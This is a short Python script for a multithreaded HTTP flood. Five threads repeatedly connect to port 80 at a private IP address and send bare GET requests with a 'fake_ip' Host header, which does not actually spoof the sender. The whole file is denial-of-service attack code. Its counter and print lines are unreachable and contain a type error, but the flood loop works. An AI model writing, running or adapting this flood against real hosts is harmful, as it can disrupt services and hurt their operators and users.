#! /usr/local/bin/python3
import threading
import socket

target = '192.168.1.216'
port = 80
fake_ip = '192.168.1.220'

attack_num = 0

def attack():
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target, port))
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()

	global attack_num
	attack_num += 1
	if attack_num % 5 == 0:
		print("Attacked with the " + attack_num + "threads.")

for i in range(5):
	thread = threading.Thread(target=attack)
	thread.start()

